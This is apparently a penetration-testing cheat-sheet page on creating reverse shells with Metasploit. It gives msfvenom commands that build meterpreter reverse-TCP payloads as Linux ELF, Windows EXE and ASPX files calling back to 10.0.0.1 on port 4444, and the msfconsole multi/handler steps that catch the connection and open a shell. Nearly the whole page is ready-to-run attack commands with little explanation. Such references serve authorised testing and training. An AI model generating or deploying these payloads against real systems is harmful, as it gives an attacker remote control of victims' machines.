---
title: Reverse Shell with Metasploit
description: We can create a reverse shell payload using Msfvenom and listen for reverse connection with Msfconsole.
tags:
    - Privilege Escalation
    - Reverse Shell
refs:
date: 2023-07-24
draft: false
---

### 1. Create a Payload using MsfVenom

```bash
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx
```

### 2. Start Listener using MsfConsole

```bash
msfconsole
msf> use exploit/multi/handler

# Linux
msf> set payload linux/x86/meterpreter/reverse_tcp
# Windows
msf> set payload windows/meterpreter/reverse_tcp
# or
msf> set payload windows/x64/meterpreter/reverse_tcp

msf> set lhost 10.0.0.1
msf> set lport 4444
msf> run
meterpreter> shell
```